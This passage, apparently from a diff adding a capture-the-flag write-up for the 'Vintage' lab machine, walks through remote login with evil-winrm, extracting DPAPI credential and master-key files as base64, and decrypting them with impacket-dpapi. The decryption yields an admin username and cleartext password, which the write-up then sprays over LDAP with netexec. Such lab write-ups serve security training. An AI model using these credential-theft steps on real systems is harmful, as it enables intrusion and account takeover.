+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">rdns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">default_ccache_name&lt;/span> &lt;span class="o">=&lt;/span> FILE:/tmp/krb5cc_%&lt;span class="o">{&lt;/span>uid&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>realms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    VINTAGE.HTB &lt;span class="o">=&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nv">kdc&lt;/span> &lt;span class="o">=&lt;/span> dc01.vintage.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nv">admin_server&lt;/span> &lt;span class="o">=&lt;/span> dc01.vintage.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nv">default_domain&lt;/span> &lt;span class="o">=&lt;/span> vintage.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>domain_realm&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    .vintage.htb &lt;span class="o">=&lt;/span> VINTAGE.HTB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    vintage.htb &lt;span class="o">=&lt;/span> VINTAGE.HTB
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-32.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="23-evil-winrm-as-cneri-">23. &lt;strong>EVIL-WINRM AS C.NERI&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i dc01.vintage.htb -r vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-33.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-36.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="24-post-enumeration-">24. &lt;strong>POST ENUMERATION&lt;/strong> :&lt;/h2>
+&lt;p>Post enumeration reveals that the system was DPAPI based.&lt;/p>
+&lt;h3 id="what-is-dpapi-">What is DPAPI ?&lt;/h3>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-39.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="how-to-abuse-it-">How to abuse it ?&lt;/h3>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-40.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dir -h
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-41.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> AppData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dir -h
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This didn’t show anything so we need to use the Get-ChildItem command&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-42.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Roaming
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Microsoft
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-43.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Credentials
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-44.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;strong>We can’t download the file directory since it has DPAPI&lt;/strong>&lt;/p>
+&lt;h2 id="25-privilege-escalation-">25. &lt;strong>PRIVILEGE ESCALATION&lt;/strong> :&lt;/h2>
+&lt;p>For such systems we can read the credentials on that very same target as:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fileContent&lt;/span>&lt;span class="o">=&lt;/span>Get-Content -Path .&lt;span class="se">\C&lt;/span>4BB96844A5C9DD45D5B6A9859252BA6 -Encoding Byte
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Convert&lt;span class="o">]&lt;/span>::ToBase64String&lt;span class="o">(&lt;/span>&lt;span class="nv">$fileContent&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-45.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 -d &amp;gt; secret
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat secret
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-46.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Now get the 2nd part of it:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> AppData&lt;span class="se">\R&lt;/span>oaming&lt;span class="se">\M&lt;/span>icrosoft&lt;span class="se">\p&lt;/span>rotect
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-47.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> S-1-5-21-4024337825-2033394866-2055507597-1115
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-48.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fileContent2&lt;/span>&lt;span class="o">=&lt;/span>Get-Content -Path .&lt;span class="se">\4&lt;/span>dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -Encoding Byte
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Convert&lt;span class="o">]&lt;/span>::ToBase64String&lt;span class="o">(&lt;/span>&lt;span class="nv">$fileContent2&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-49.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fileContent3&lt;/span>&lt;span class="o">=&lt;/span>Get-Content -Path .&lt;span class="se">\9&lt;/span>9cf41a3-a552-4cf7-a8d7-aca2d6f7339b -Encoding Byte
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Convert&lt;span class="o">]&lt;/span>::ToBase64String&lt;span class="o">(&lt;/span>&lt;span class="nv">$fileContent3&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-50.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 -d &amp;gt; b1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-51.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat b1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-52.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 -d &amp;gt; b2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-53.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat b2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-54.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="26-decrypting-the-found-credentials-of-dpapi-">26. &lt;strong>DECRYPTING THE FOUND CREDENTIALS OF DPAPI&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi masterkey -file b1 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-55.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>Decrypted key:&lt;/code>
+&lt;code>0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi masterkey -file b2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-56.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>Decrypted key:&lt;/code>
+&lt;code>0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi credential -file secret -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-57.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi credential -file secret -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-58.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>Username:&lt;/code> &lt;strong>vintage\c.neri_adm&lt;/strong>
+&lt;code>Password:&lt;/code> &lt;strong>Uncr4ck4bl3P4ssW0rd0312&lt;/strong>&lt;/p>
+&lt;p>So we got a &lt;strong>neri_adm&lt;/strong> user. Lets check this user via bloodhound. And also its ldap information&lt;/p>
+&lt;h2 id="27-cneri_adm-ldap-information-">27. &lt;strong>C.NERI_ADM LDAP INFORMATION&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo netexec ldap 10.10.11.45 -u usernames.txt -p Uncr4ck4bl3P4ssW0rd0312 -k --continue-on-success
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-59.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-60.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo netexec ldap 10.10.11.45 -u C.Neri_adm -p Uncr4ck4bl3P4ssW0rd0312 -k --query &lt;span class="s2">&amp;#34;(sAMAccountName=C.Neri_adm)&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-61.png" alt="" loading="lazy" data-zoomable />&lt;/div>
